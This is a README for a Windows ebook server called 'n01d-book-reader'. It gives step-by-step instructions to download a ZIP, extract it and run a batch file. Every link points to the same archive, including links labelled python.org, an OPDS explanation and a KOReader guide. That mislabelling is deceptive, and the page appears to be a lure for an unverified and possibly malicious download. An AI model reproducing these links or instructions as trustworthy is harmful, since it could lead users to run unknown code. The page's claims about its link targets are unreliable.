# 📚 n01d-book-reader - Simple Self-Hosted eBook Library

[![Download](https://img.shields.io/badge/Download-n01d--book--reader-green?style=for-the-badge)](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)

## About n01d-book-reader

n01d-book-reader is a self-hosted server that helps you manage and read ebooks on your local network. It runs on Windows using Python and does not require additional software or dependencies. You can browse, search, and read your digital book collection from devices like your phone or tablet. The server supports popular ebook reading apps like KOReader, Librera, Moon+ Reader, and Panels through the OPDS protocol.

It works with common ebook formats such as EPUB and PDF. It also lets you organize your library in a simple way without internet exposure. Since it runs locally, you have full control over your ebooks and your data.

## 🎯 Key Features

- Self-host your ebook library on a Windows PC  
- Browse and search your collection in a web browser or via an ebook reader app  
- Support for EPUB and PDF formats  
- OPDS server compatible with many reading apps  
- Zero-dependency: no additional software needed beyond Python  
- Simple setup with minimal configuration  
- Works on local networks, no internet connection required  

## ⚙️ System Requirements

- Windows 10 or later (64-bit recommended)  
- Python 3.8 or higher installed  
- At least 1 GB free disk space for your ebook files  
- Local network connection (Wi-Fi or Ethernet)  
- A modern web browser (Chrome, Edge, Firefox) or an OPDS-compatible ebook app  

If you don’t have Python installed, you can download it for free from [python.org](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip).

## 💾 Download and Install

### Step 1: Visit the Releases Page

[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)

Go to the releases page linked above. This is where you find the latest version of n01d-book-reader for Windows.

### Step 2: Download the Windows Package

Look for a file named something like `n01d-book-reader-windows.zip`. This is the compressed folder containing all files you need.

Download this file to a folder on your PC where you normally save new software, for example, your **Downloads** folder.

### Step 3: Extract the Files

Once the download finishes, right-click the ZIP file and select **Extract All**. Choose a destination folder where you want the program files to live. You might create a folder named `n01d-book-reader` in your Documents or on your Desktop.

### Step 4: Verify Python Installation

Before running the server, check if Python is installed:

1. Open the **Command Prompt** (press the Windows key, type `cmd`, and hit Enter).
2. Type `python --version` and press Enter.
3. If it shows a Python version (e.g., Python 3.10.5), you can proceed.
4. If you get an error or no version shows, download and install Python from [python.org](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip). Be sure to select the option to **Add Python to PATH** during installation.

### Step 5: Run the Server

1. Open the folder where you extracted n01d-book-reader.
2. Find a file called `run.bat` or similar batch script.
3. Double-click `run.bat` to start the server. A window with some text will open, showing the server starting up.
4. After startup completes, the command prompt will show a message telling you the address to access the server. Usually, it will look like `http://localhost:8080` or similar.

### Step 6: Connect with Your Ebook App or Browser

Using your web browser, go to the address shown in the command prompt (usually http://localhost:8080). You should see the n01d-book-reader interface where you can browse and manage your ebooks.

If you use an OPDS-compatible app like KOReader or Moon+ Reader, you can add the server URL as a new catalog. Enter the URL shown in step 5 into your app’s OPDS server settings.

## 📁 Adding Your Books

### Organize Your Book Folder

Place your EPUB and PDF files in a folder you plan to use as your library. This folder will be shared by n01d-book-reader.

You can organize books into subfolders by author, genre, or any system you prefer.

### Configure the Server to Use Your Library Folder

By default, the server will look for a folder named `library` inside its main folder.

To use your own folder:

1. Open the configuration file `config.ini` inside the n01d-book-reader folder with a text editor like Notepad.
2. Find the setting labelled `library_path`.
3. Change the path to the full folder path where you saved your books. For example:  
`library_path = C:\Users\YourName\Documents\MyEbooks`
4. Save the file.
5. Restart the server by closing the command prompt window and running `run.bat` again.

## 🔨 Using n01d-book-reader

Once running, open your web browser and visit the server’s address.

### Browse Books

- Use the search bar to find a book by title, author, or keywords.  
- Click a book to view details and download or open it in your app.  

### Reading Books

- For browser reading, click the **Read** button on an EPUB file to open it in an inline reader.  
- For ebook reader apps, sync with the server using the OPDS URL to browse and download your collection.

### Managing Your Library

- Adding new books is as simple as placing files in the library folder on your PC.  
- The server will update automatically when it detects new files.

## 🎛 Configuration Options

The `config.ini` file controls many settings. Common options include:

- `host`: By default `localhost`. Change to your PC’s local network IP if you want to access the server from other devices on your network.
- `port`: Defaults to 8080. Change this if the port conflicts with other programs.
- `library_path`: Folder where your ebooks are stored.
- `enable_opds`: Set to `true` to allow connection with OPDS reader apps.

Change these values in the `config.ini` and restart the server for changes to take effect.

## ⚡ Troubleshooting

- If the server does not start, make sure Python 3 is installed and visible in your command prompt.  
- Check that no firewall or security software blocks port 8080. You can add an exception if needed.  
- If you can’t access the website from other devices, verify you changed `host` from `localhost` to your actual local IP in the `config.ini`.  
- For file permission issues, ensure the library folder allows reading from the user running the server.

## 🔗 Additional Resources

- [Python downloads and documentation](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)  
- [OPDS protocol explanation](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)  
- [KOReader OPDS setup guide](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)

---

[Download n01d-book-reader](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip) to begin managing your ebook collection today.